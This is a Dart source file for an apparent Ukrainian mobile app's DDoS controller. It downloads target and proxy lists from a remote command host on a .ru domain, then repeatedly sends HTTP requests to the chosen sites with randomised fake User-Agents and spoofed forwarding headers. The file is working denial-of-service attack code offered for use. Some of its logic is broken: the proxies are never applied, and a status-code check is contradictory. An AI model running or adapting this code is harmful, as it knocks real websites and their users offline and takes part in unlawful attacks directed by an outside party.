import 'dart:async';
import 'dart:convert';
import 'dart:developer' as dev;
import 'dart:math';
import 'package:faker/faker.dart';
import 'package:http/http.dart' as http;
import 'package:uk_power/ddos_status.dart';

class DDOSController {
  late List<String> hosts;

  Future<DDOSInfo> init() async {
    DDOSInfo info = DDOSInfo(
      msg: "Спробуйте ще раз, щось пішло не так",
      responseCode: -1,
      status: DDOSStatus.error,
      dateTime: DateTime.now(),
      target: Uri(),
    );

    try {
      var response = await http.get(
        Uri.parse(
          "http://rockstarbloggers.ru/hosts.json",
        ),
      );

      var jsonArray = response.body;
      jsonArray = jsonArray.replaceAll("[", "").replaceAll("]", "");
      jsonArray = jsonArray.replaceAll("\"", "").replaceAll("\n", "").trim();

      hosts = [];

      var splitted = jsonArray.split(", ");
      for (var url in splitted) {
        hosts.add(url.trim());
      }

      info
        ..msg = "Успішно з'єднано до ресурсів: ${hosts.length} шт."
        ..responseCode = 200
        ..status = DDOSStatus.success
        ..target = Uri.parse("all")
        ..dateTime = DateTime.now();

      return info;
    } catch (ex) {
      dev.log(ex.toString());
      return info;
    }
  }

  /// за Україну
  Future<void> dance(void Function(DDOSInfo) callback) async {
    int statusCode = -1;
    var timeout = const Duration(seconds: 10);

    DDOSInfo info = DDOSInfo(
      msg: "Виникла помилка",
      status: DDOSStatus.error,
      dateTime: DateTime.now(),
      target: Uri(),
      responseCode: statusCode,
    );

    // create headers
    Map<String, String> headers = {
      'Content-Type': 'application/json',
      'cf-visitor': 'https',
      'User-Agent': faker.internet.userAgent(),
      'Connection': 'keep-alive',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'ru',
      'x-forwarded-proto': 'https',
      'Accept-Encoding': 'gzip, deflate, br',
    };

    // randomly select resources from the list
    String resource = hosts.elementAt(Random().nextInt(hosts.length));

    try {
      var response = await http.get(Uri.parse(resource), headers: headers);
      info = DDOSInfo(
        msg: "Виникла помилка",
        status: DDOSStatus.error,
        dateTime: DateTime.now(),
        target: Uri.parse(resource),
        responseCode: response.statusCode,
      );

      if (response.body.isEmpty) {
        info = DDOSInfo(
          msg: "Не отримали відповіді",
          status: DDOSStatus.error,
          dateTime: DateTime.now(),
          target: Uri.parse(resource),
          responseCode: response.statusCode,
        );

        callback(info);
        return;
      }

      // get attack info
      var json = jsonDecode(response.body);
      var site = json['site'];
      var proxies = json['proxy'];

      String target = site['page'];
      if (!target.startsWith("http")) {
        target = "https://$target";
      }

      headers['User-Agent'] = faker.internet.userAgent();

      var attackResponse =
          await http.get(Uri.parse(target), headers: headers).timeout(
                timeout,
                onTimeout: () => throw TimeoutException(
                  'Перевищенно очікування 10 сек.',
                ),
              );

      statusCode = attackResponse.statusCode;
      if (statusCode >= 302 && statusCode >= 200) {
        // lets use proxies
        for (var proxy in proxies) {
          headers['User-Agent'] = faker.internet.userAgent();
          var auth = proxy['auth'];
          var ip = proxy['ip'];

          attackResponse =
              await http.get(Uri.parse(target), headers: headers).timeout(
                    timeout,
                    onTimeout: () => throw TimeoutException(
                      'Перевищенно очікування 10 сек.',
                    ),
                  );

          statusCode = attackResponse.statusCode;

          info = DDOSInfo(
            msg: "Достукались",
            target: Uri.parse(target),
            dateTime: DateTime.now(),
            responseCode: statusCode,
            status: DDOSStatus.success,
          );
          callback(info);
        }
      } else {
        // lets dance
        for (int i = 0; i < 20; i++) {
          headers['User-Agent'] = faker.internet.userAgent();
          attackResponse =
              await http.get(Uri.parse(target), headers: headers).timeout(
                    timeout,
                    onTimeout: () => throw TimeoutException(
                      'Перевищенно очікування 10 сек.',
                    ),
                  );

          statusCode = attackResponse.statusCode;

          info = DDOSInfo(
            msg: "Достукались",
            target: Uri.parse(target),
            dateTime: DateTime.now(),
            responseCode: statusCode,
            status: DDOSStatus.success,
          );
          callback(info);
        }
      }
    } catch (ex) {
      dev.log(ex.toString());
      info = DDOSInfo(
        msg: ex.toString(),
        status: DDOSStatus.error,
        dateTime: DateTime.now(),
        target: Uri.parse(resource),
        responseCode: statusCode,
      );
      callback(info);
    }
  }
}
